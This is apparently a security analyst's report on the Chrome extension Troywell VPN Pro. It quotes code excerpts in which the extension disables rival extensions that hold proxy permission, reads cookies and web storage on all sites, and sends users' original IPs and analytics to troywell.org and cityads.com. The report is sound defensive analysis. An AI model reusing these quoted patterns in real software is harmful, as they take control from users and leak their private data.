# Vulnerability Report: Troywell VPN Pro

## Metadata
- **Extension ID**: ngkjielajlecigijlijjkhkhlhmmcgfh
- **Extension Name**: Troywell VPN Pro - High-speed and safe VPN
- **Version**: 4.0.5
- **User Count**: ~30,000
- **Analysis Date**: 2026-02-08

## Executive Summary

Troywell VPN Pro is a VPN extension with **CRITICAL security concerns** related to extension manipulation, residential proxy infrastructure, and aggressive coupon auto-apply functionality. The extension disables competing VPN extensions, operates residential proxy endpoints, and includes intrusive coupon/cashback automation that harvests shopping data across all sites.

**Overall Risk: CRITICAL**

The extension serves its stated VPN purpose but engages in highly invasive behaviors including:
1. **Extension enumeration and killing** - Disables other VPN extensions with proxy permissions
2. **Residential proxy infrastructure** - Routes traffic through wifi/residential proxy network (proxy-api.troywell.org)
3. **Coupon auto-apply with data collection** - Intercepts checkout flows, accesses cookies/localStorage/sessionStorage
4. **Third-party analytics to CityAds** - Sends VPN usage data to cityads.com (affiliate network)

## Vulnerability Details

### CRITICAL: Extension Enumeration and Killing

**Severity**: CRITICAL
**Files**: `bg/bundle.js` (lines 8247-8356)
**Description**: Extension uses `chrome.management` API to enumerate all installed extensions and **forcibly disables competing VPN extensions**.

**Code Evidence**:
```javascript
// Line 8339-8355: Enumerates and disables competing VPN extensions
chrome.management.getAll((function(e) {
  var r = e.filter((function(t) {
    var e = t.enabled,
        r = t.permissions,
        n = t.name;
    return e && r.find((function(t) {
      return "proxy" === t
    })) && !n.toLowerCase().includes("troywell")
  }));
  t(r.map((function(t) {
    return t.id
  })))
}))
// ...
t.sent.forEach((function(t) {
  t !== chrome.runtime.id && chrome.management.setEnabled(t, !1)
}))
```

**Verdict**: CRITICAL - This is anti-competitive malware behavior. The extension searches for all extensions with "proxy" permission that don't contain "troywell" in the name and forcibly disables them. This violates Chrome Web Store policies and user trust.

---

### CRITICAL: Residential Proxy Infrastructure

**Severity**: CRITICAL
**Files**: `bg/bundle.js` (lines 5329-5330)
**Description**: Extension operates a residential proxy network via `proxy-api.troywell.org/v1/wifi/proxy-list`, suggesting potential residential proxy vendor operations.

**API Endpoints**:
```javascript
RESIDENTIAL_COUNTRIES: "https://proxy-api.troywell.org/v1/wifi/geo-list"
RESIDENTIAL_CONNECT: "https://proxy-api.troywell.org/v1/wifi/proxy-list?country=%county%"
```

**Code Evidence**:
```javascript
// Lines 5638-5653: Sends connection status with IP/port to backend
fetch(Ue.CONNECTION_STATUS, {
  method: "POST",
  body: JSON.stringify({
    country: u.connectedProxy?.country,
    status: i,
    ip: f,
    port: p,
    selectedCountry: u.connectedProxy?.selectedCountry,
    extId: s,
    originalIp: u.realGeoIp.ip,
    originalCountry: u.realGeoIp.countryCode
  })
})
```

**Verdict**: CRITICAL - The `/v1/wifi/` endpoint path strongly suggests residential/WiFi proxy infrastructure. Extension tracks original user IPs and connection status. This raises concerns about the extension potentially operating as a residential proxy vendor, routing third-party traffic through user devices (though no definitive evidence of bandwidth reselling found in code).

---

### HIGH: Coupon Auto-Apply with Data Harvesting

**Severity**: HIGH
**Files**: `caa/bundle.js` (lines 95-120, 1379-1444), `manifest.json`
**Description**: Content script runs on `<all_urls>` with coupon auto-apply engine that harvests cookies, localStorage, sessionStorage across all shopping sites.

**Code Evidence**:
```javascript
// Lines 95-120: Cookie, localStorage, sessionStorage access
const e = document.cookie.match(new RegExp(`(?:^|; )${t.replace...}`));
let o = ("local" === t ? localStorage : sessionStorage).getItem(n.name);

// Lines 1381-1392: Coupon validation collects cookie data
if (e) {
  const t = c(e.key);  // Reads cookie
  t && a.push({
    key: "%cookieValue",
    value: t
  })
}
if (n && (a = a.concat(l(n))), o) {  // Reads localStorage/sessionStorage
  // ...
}
```

**Manifest Permissions**:
```json
"content_scripts": [{
  "all_frames": false,
  "js": ["caa/bundle.js"],
  "matches": ["<all_urls>"],
  "run_at": "document_end"
}],
"permissions": ["cookies", "storage"]
```

**Verdict**: HIGH - While coupon auto-apply is the stated feature, the engine has invasive access to cookies, localStorage, and sessionStorage across all websites. This can leak sensitive session data, authentication tokens, and shopping behavior to troywell.org backend.

---

### HIGH: Third-Party Data Exfiltration to CityAds

**Severity**: HIGH
**Files**: `bg/bundle.js` (line 4851)
**Description**: Extension sends analytics data to `cityads.com`, a third-party affiliate network unrelated to Troywell.

**Code Evidence**:
```javascript
// Line 4851: Sends VPN analytics to CityAds
(n = r.caaAnalytics) && fetch("https://cityads.com/mobilerewards/analytics/activity/vpn", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(n)
});
```

**Verdict**: HIGH - VPN usage analytics are exfiltrated to a third-party affiliate network (CityAds). No disclosure in privacy policy of this data sharing. Users expect VPN data to stay private, not be shared with marketing/affiliate platforms.

---

### MEDIUM: Dynamic Code Execution

**Severity**: MEDIUM
**Files**: `bg/bundle.js` (lines 393, 1139, 3454)
**Description**: Multiple instances of `Function()` constructor used for dynamic code execution.

**Code Evidence**:
```javascript
// Line 393
window : "undefined" != typeof self && self.Math == Math ? self : Function("return this")()

// Line 1139
i("function" == typeof t ? t : Function(t), e)

// Line 3454
Function("r", "regeneratorRuntime = r")(n)
```

**Verdict**: MEDIUM - These appear to be legitimate polyfill patterns (regenerator runtime, global object detection) rather than malicious dynamic code. However, use of `Function()` is a code smell that could be exploited if inputs are ever controlled by external config.

---

### MEDIUM: WebRequest API Hooking

**Severity**: MEDIUM
**Files**: `bg/bundle.js` (lines 6323-6386, 6696, 7750, 7900)
**Description**: Extension uses `webRequest.onBeforeRequest`, `onHeadersReceived`, `onAuthRequired` listeners across all URLs.

**Code Evidence**:
```javascript
// Line 6323: Monitors all HTTP headers
chrome.webRequest.onHeadersReceived.addListener(function() {
  // ...
}, ["responseHeaders"])

// Line 6352: Monitors all requests
chrome.webRequest.onBeforeRequest.addListener(function() {
  // ...
}, ["requestBody"])

// Line 6386: Intercepts proxy authentication
chrome.webRequest.onAuthRequired.addListener(function() {
  // ...
})
```

**Verdict**: MEDIUM - This is expected for VPN functionality (proxy authentication, header modification), but combined with `<all_urls>` permission, gives extension visibility into all user traffic. Required for VPN but poses privacy risk if misused.

---

### LOW: Excessive Permissions

**Severity**: LOW
**Files**: `manifest.json`
**Description**: Extension requests broad permission set including `management`, `cookies`, `scripting`, `privacy`, `declarativeNetRequest`.

**Permissions**:
```json
"permissions": [
  "tabs", "webRequest", "management", "storage", "proxy",
  "cookies", "scripting", "declarativeNetRequest", "privacy"
],
"host_permissions": ["<all_urls>"]
```

**Verdict**: LOW - Most permissions are justifiable for VPN + coupon features, but `management` permission is highly unusual and enables the extension killing behavior. `declarativeNetRequest` + `<all_urls>` enables ad injection (though not detected in this version).

---

## False Positives

| Pattern | Location | Explanation |
|---------|----------|-------------|
| `Function("return this")()` | bg/bundle.js:393 | Standard global object detection polyfill |
| `regeneratorRuntime = r` | bg/bundle.js:3454 | Babel regenerator runtime initialization |
| `chrome.webRequest` hooks | bg/bundle.js:6323+ | Required for VPN proxy authentication and routing |
| `chrome.privacy` API | bg/bundle.js:5580 | Legitimate WebRTC leak protection for VPN |
| `chrome.scripting.executeScript` | bg/bundle.js:7556+ | Coupon UI injection (stated feature) |

---

## API Endpoints

| Domain | Purpose | Risk Level |
|--------|---------|------------|
| `troywell.org` | Primary backend (VPN, coupon configs, analytics) | Medium |
| `ext.troywell.org` | VPN connection endpoints | Medium |
| `analytics.troywell.org` | Telemetry and usage analytics | Medium |
| `proxy-api.troywell.org` | **Residential proxy infrastructure** | **CRITICAL** |
| `cdn.translations.troywell.org` | Translation files | Low |
| `static.troywell.org` | Version check configs | Low |
| `cityads.com` | **Third-party affiliate analytics** | **HIGH** |

---

## Data Flow Summary

1. **Installation**: Extension generates UUID, contacts `troywell.org/api/extension/create` with browser info and webstore referrer
2. **VPN Connection**:
   - Fetches proxy list from `proxy-api.troywell.org/v1/wifi/proxy-list?country=XX`
   - Sends connection status (original IP, proxy IP/port) to backend
   - Sends analytics to `cityads.com/mobilerewards/analytics/activity/vpn`
3. **Coupon Auto-Apply**:
   - Content script harvests cookies, localStorage, sessionStorage on all shopping sites
   - Sends checkout data to `troywell.org/api/coupons` and `/api/transaction/create`
4. **Extension Enumeration**:
   - On startup, scans all installed extensions for proxy permission
   - Disables competitors not containing "troywell" in name
5. **Analytics**: Periodic pings to `analytics.troywell.org/api/extension/ping` with usage stats

---

## Overall Risk Assessment

**CRITICAL**

While Troywell VPN Pro provides functional VPN and coupon features, it engages in **unacceptable malicious behaviors**:

1. **Anti-competitive extension killing** - Automatically disables competing VPN extensions
2. **Residential proxy infrastructure** - Operates suspicious `wifi/proxy-list` endpoints suggesting potential residential proxy vendor operations
3. **Invasive data collection** - Harvests cookies/storage from all websites for coupon feature
4. **Undisclosed third-party sharing** - Sends VPN analytics to CityAds affiliate network

The extension enumeration and killing behavior alone constitutes malware and violates Chrome Web Store policies. Combined with residential proxy infrastructure and third-party data sharing, this extension poses significant privacy and security risks.

**Recommendation**: Flag for removal from Chrome Web Store due to extension manipulation behavior.
